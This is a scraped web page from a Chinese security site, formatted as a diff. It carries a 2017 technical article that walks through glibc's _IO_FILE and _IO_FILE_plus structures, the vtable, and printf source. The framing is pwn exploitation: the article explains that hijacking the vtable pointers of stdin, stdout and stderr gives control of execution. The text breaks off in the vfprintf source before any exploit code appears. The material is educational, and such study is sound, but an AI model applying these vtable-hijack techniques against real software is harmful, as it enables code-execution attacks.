@@ -1,0 +1,1096 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】教练！那根本不是IO！——从printf源码看libc的IO - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="IO,scanf,printf,c语言,libc"/>
+    
+        <meta name="description" content="我们似乎天天都在使用IO，最典型的使用就是printf，scanf，以前我们只知道printf会有格式化字符串漏洞，可是我们并没有怎么深究过IO具体的是怎么回事，以及具体有什么可以攻击的点。本文主要从经典的虚表原理开始说起，中间补充一下scanf和printf的原理，最后提到一种较新的（或者是我认为较新的？）思路。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】教练！那根本不是IO！——从printf源码看libc的IO</h2>
+                <div class="article-msg">
+                    <span class="time">2017-09-28 13:54:15</span>
+                    
+                                        <span class="read">阅读：8041次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4490"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4490" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2806750221" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2806750221" style="color:#848e99;">anciety</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t01fc7375650a0c78c1.jpg" title="t0103204184817051e1.jpg" alt="http://p7.qhimg.com/t0103204184817051e1.jpg"/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2806750221" target="_self" style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">anciety</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：500RMB</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前(fei)言(hua)</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们似乎天天都在使用IO，最典型的使用就是printf，scanf，以前我们只知道printf会有格式化字符串漏洞，可是我们并没有怎么深究过IO具体的是怎么回事，以及具体有什么可以攻击的点。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2016 HITCON有一道 house of orange，是一道堪称经典的题目，第一次（或者似乎是第一次？）让我们把攻击的思维往IO FILE里去考虑，于是我们开始思考libc的虚表的可攻击性，不幸的是，libc的开发人员也很快意识到了这个虚表的问题，在2.24的libc版本中对vtables进行了加固：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">2.24&nbsp;libc更新日志中的一个内容：
+&nbsp;&nbsp;[20191]&nbsp;stdio:&nbsp;libio:&nbsp;vtables&nbsp;hardening</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">于是这个方法慢慢变得困难了起来，还好我们的思路不仅仅是这样……</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文主要从经典的虚表原理开始说起，中间补充一下scanf和printf的原理，最后提到一种较新的（或者是我认为较新的？）思路。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">从虚表开始说起</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">首先我们来看下经典的（虽然似乎是2016之后才流行起来的）<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);"><strong>_IO_FILE_plus</strong></span>的虚表攻击方式。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>_IO_FILE 与 _IO_FILE_plus</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">源码永远是回答心中疑问的好老师，首先来看看关于这两个结构体的源码：</span></p><pre class="brush:cpp;toolbar:false">//&nbsp;libio/libio.h&nbsp;_IO_FILE&nbsp;结构体
+struct&nbsp;_IO_FILE&nbsp;{
+&nbsp;&nbsp;int&nbsp;_flags;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;High-order&nbsp;word&nbsp;is&nbsp;_IO_MAGIC;&nbsp;rest&nbsp;is&nbsp;flags.&nbsp;*/
+#define&nbsp;_IO_file_flags&nbsp;_flags
+&nbsp;&nbsp;/*&nbsp;The&nbsp;following&nbsp;pointers&nbsp;correspond&nbsp;to&nbsp;the&nbsp;C++&nbsp;streambuf&nbsp;protocol.&nbsp;*/
+&nbsp;&nbsp;/*&nbsp;Note:&nbsp;&nbsp;Tk&nbsp;uses&nbsp;the&nbsp;_IO_read_ptr&nbsp;and&nbsp;_IO_read_end&nbsp;fields&nbsp;directly.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_read_ptr;&nbsp;&nbsp;&nbsp;/*&nbsp;Current&nbsp;read&nbsp;pointer&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_read_end;&nbsp;&nbsp;&nbsp;/*&nbsp;End&nbsp;of&nbsp;get&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_read_base;&nbsp;&nbsp;/*&nbsp;Start&nbsp;of&nbsp;putback+get&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_write_base;&nbsp;/*&nbsp;Start&nbsp;of&nbsp;put&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_write_ptr;&nbsp;&nbsp;/*&nbsp;Current&nbsp;put&nbsp;pointer.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_write_end;&nbsp;&nbsp;/*&nbsp;End&nbsp;of&nbsp;put&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_buf_base;&nbsp;&nbsp;&nbsp;/*&nbsp;Start&nbsp;of&nbsp;reserve&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;char*&nbsp;_IO_buf_end;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;End&nbsp;of&nbsp;reserve&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;/*&nbsp;The&nbsp;following&nbsp;fields&nbsp;are&nbsp;used&nbsp;to&nbsp;support&nbsp;backing&nbsp;up&nbsp;and&nbsp;undo.&nbsp;*/
+&nbsp;&nbsp;char&nbsp;*_IO_save_base;&nbsp;/*&nbsp;Pointer&nbsp;to&nbsp;start&nbsp;of&nbsp;non-current&nbsp;get&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;char&nbsp;*_IO_backup_base;&nbsp;&nbsp;/*&nbsp;Pointer&nbsp;to&nbsp;first&nbsp;valid&nbsp;character&nbsp;of&nbsp;backup&nbsp;area&nbsp;*/
+&nbsp;&nbsp;char&nbsp;*_IO_save_end;&nbsp;/*&nbsp;Pointer&nbsp;to&nbsp;end&nbsp;of&nbsp;non-current&nbsp;get&nbsp;area.&nbsp;*/
+&nbsp;&nbsp;struct&nbsp;_IO_marker&nbsp;*_markers;
+&nbsp;&nbsp;struct&nbsp;_IO_FILE&nbsp;*_chain;
+&nbsp;&nbsp;int&nbsp;_fileno;
+#if&nbsp;0
+&nbsp;&nbsp;int&nbsp;_blksize;
+#else
+&nbsp;&nbsp;int&nbsp;_flags2;
+#endif
+&nbsp;&nbsp;_IO_off_t&nbsp;_old_offset;&nbsp;/*&nbsp;This&nbsp;used&nbsp;to&nbsp;be&nbsp;_offset&nbsp;but&nbsp;it&#39;s&nbsp;too&nbsp;small.&nbsp;&nbsp;*/
+#define&nbsp;__HAVE_COLUMN&nbsp;/*&nbsp;temporary&nbsp;*/
+&nbsp;&nbsp;/*&nbsp;1+column&nbsp;number&nbsp;of&nbsp;pbase();&nbsp;0&nbsp;is&nbsp;unknown.&nbsp;*/
+&nbsp;&nbsp;unsigned&nbsp;short&nbsp;_cur_column;
+&nbsp;&nbsp;signed&nbsp;char&nbsp;_vtable_offset;
+&nbsp;&nbsp;char&nbsp;_shortbuf[1];
+&nbsp;&nbsp;/*&nbsp;&nbsp;char*&nbsp;_save_gptr;&nbsp;&nbsp;char*&nbsp;_save_egptr;&nbsp;*/
+&nbsp;&nbsp;_IO_lock_t&nbsp;*_lock;
+#ifdef&nbsp;_IO_USE_OLD_IO_FILE
+};</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以及_IO_FILE_plus：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">//&nbsp;libio/libioP.h
+#define&nbsp;JUMP_FIELD(TYPE,&nbsp;NAME)&nbsp;TYPE&nbsp;NAME
+#define&nbsp;JUMP0(FUNC,&nbsp;THIS)&nbsp;(_IO_JUMPS_FUNC(THIS)-&gt;FUNC)&nbsp;(THIS)
+struct&nbsp;_IO_jump_t&nbsp;//&nbsp;虚表结构体
+{
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(size_t,&nbsp;__dummy);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(size_t,&nbsp;__dummy2);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_finish_t,&nbsp;__finish);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_overflow_t,&nbsp;__overflow);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_underflow_t,&nbsp;__underflow);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_underflow_t,&nbsp;__uflow);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_pbackfail_t,&nbsp;__pbackfail);
+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;showmany&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_xsputn_t,&nbsp;__xsputn);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_xsgetn_t,&nbsp;__xsgetn);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_seekoff_t,&nbsp;__seekoff);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_seekpos_t,&nbsp;__seekpos);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_setbuf_t,&nbsp;__setbuf);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_sync_t,&nbsp;__sync);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_doallocate_t,&nbsp;__doallocate);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_read_t,&nbsp;__read);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_write_t,&nbsp;__write);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_seek_t,&nbsp;__seek);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_close_t,&nbsp;__close);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_stat_t,&nbsp;__stat);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_showmanyc_t,&nbsp;__showmanyc);
+&nbsp;&nbsp;&nbsp;&nbsp;JUMP_FIELD(_IO_imbue_t,&nbsp;__imbue);
+#if&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;get_column;
+&nbsp;&nbsp;&nbsp;&nbsp;set_column;
+#endif
+};
+struct&nbsp;_IO_FILE_plus
+{
+&nbsp;&nbsp;_IO_FILE&nbsp;file;&nbsp;//&nbsp;就是一个libio.h中的_IO_FILE&nbsp;结构体
+&nbsp;&nbsp;const&nbsp;struct&nbsp;_IO_jump_t&nbsp;*vtable;&nbsp;//　多出一个vtable
+};</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们可以看到<strong>_IO_FILE_plus</strong>的组成，其实就是一个<strong>_IO_FILE</strong>结构体本身再加上一个跳表，从plus这个名称我们也能看出来，其实这个地方是为了兼容C++，对于C++的对象来说，除了数据以外还有方法，方法的实现是会用到跳表的，为了能够兼容，除了<strong>_IO_FILE</strong>本身以外，只能再添加一个跳表，然后使用新的结构体来进行兼容。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">事实上在libc内部对于FILE结构体就是用<strong>_IO_FILE_plus</strong>来进行表示的，但是对于pwn选手来说，只要有函数指针，就有控制执行流的可能，唯一的问题是，用谁的函数指针？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个其实并不是一个难事，因为每一个文件一定都有3个FILE，也就是以下三个，我想大家已经不能再熟悉他们了：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">//&nbsp;libio/libio.h
+extern&nbsp;struct&nbsp;_IO_FILE_plus&nbsp;_IO_2_1_stdin_;
+extern&nbsp;struct&nbsp;_IO_FILE_plus&nbsp;_IO_2_1_stdout_;
+extern&nbsp;struct&nbsp;_IO_FILE_plus&nbsp;_IO_2_1_stderr_;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">是的，就是stdin, stdout和stderr，好了，那么这种利用的思路应该就比较明确了：只要我们有办法控制stdin，stdout和stderr的虚表指针，我们就能够在使用到这三个结构体的虚表的时候控制执行流。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不过还有一个小问题，到底在什么时候这些函数指针会被用到？那么让我们继续从输入输出开始说起……</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; white-space: pre;"></span>你不熟悉的scanf和printf</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以下内容源码较长，可能引起不适，请适度观看。为了简单，我们就从printf开始看。首先是printf的入口：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">//&nbsp;stdio-common/printf.c
+int
+__printf&nbsp;(const&nbsp;char&nbsp;*format,&nbsp;...)
+{
+&nbsp;&nbsp;va_list&nbsp;arg;
+&nbsp;&nbsp;int&nbsp;done;
+&nbsp;&nbsp;va_start&nbsp;(arg,&nbsp;format);
+&nbsp;&nbsp;done&nbsp;=&nbsp;vfprintf&nbsp;(stdout,&nbsp;format,&nbsp;arg);
+&nbsp;&nbsp;va_end&nbsp;(arg);
+&nbsp;&nbsp;return&nbsp;done;
+}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">直接移交给了<strong>vfprintf</strong>，好吧，再来看<strong>vfprintf</strong>：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（觉得代码太长的同学可以直接跳到最后看结论）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">//&nbsp;stdio-common/vfprintf.c
+//&nbsp;这里好像有一些神奇的地方，我所使用的ubuntu-2.23的libc这里调用的是
+//&nbsp;_IO_vfprintf_internal，不过逻辑似乎没有什么区别
+//&nbsp;分析整个printf太恐怖了，我们就看%s和%d的实现好了
+//&nbsp;以下是一开始调用所需要关注的部分
+/*&nbsp;The&nbsp;function&nbsp;itself.&nbsp;&nbsp;*/
+int
+vfprintf&nbsp;(FILE&nbsp;*s,&nbsp;const&nbsp;CHAR_T&nbsp;*format,&nbsp;va_list&nbsp;ap)
+{
+&nbsp;&nbsp;[...]
+&nbsp;&nbsp;//&nbsp;检查参数
+&nbsp;&nbsp;ARGCHECK&nbsp;(s,&nbsp;format);
+&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(UNBUFFERED_P&nbsp;(s))
+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Use&nbsp;a&nbsp;helper&nbsp;function&nbsp;which&nbsp;will&nbsp;allocate&nbsp;a&nbsp;local&nbsp;temporary&nbsp;buffer
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;the&nbsp;stream&nbsp;and&nbsp;then&nbsp;call&nbsp;us&nbsp;again.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;调用了buffered_vfprintf
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;buffered_vfprintf&nbsp;(s,&nbsp;format,&nbsp;ap);
+&nbsp;&nbsp;[...]
+}
+static&nbsp;int
+internal_function
+buffered_vfprintf&nbsp;(_IO_FILE&nbsp;*s,&nbsp;const&nbsp;CHAR_T&nbsp;*format,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_va_list&nbsp;args)
+{
+&nbsp;&nbsp;[...]
+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Initialize&nbsp;helper.&nbsp;&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;设置一个helper结构，这个结构看后文
+&nbsp;&nbsp;helper._put_stream&nbsp;=&nbsp;s;
+&nbsp;&nbsp;[...]
+&nbsp;&nbsp;//&nbsp;设置好了helper，跳回去
+&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;vfprintf&nbsp;(hp,&nbsp;format,&nbsp;args);
+&nbsp;&nbsp;[...]
+&nbsp;&nbsp;return&nbsp;result
+}
+//&nbsp;好了经过helper的设置，我们又跳回来了，
+/*&nbsp;The&nbsp;function&nbsp;itself.&nbsp;&nbsp;*/
+int
+vfprintf&nbsp;(FILE&nbsp;*s,&nbsp;const&nbsp;CHAR_T&nbsp;*format,&nbsp;va_list&nbsp;ap)
+{
+&nbsp;&nbsp;[...]
+&nbsp;&nbsp;//&nbsp;一个大do-while来处理格式化字符串
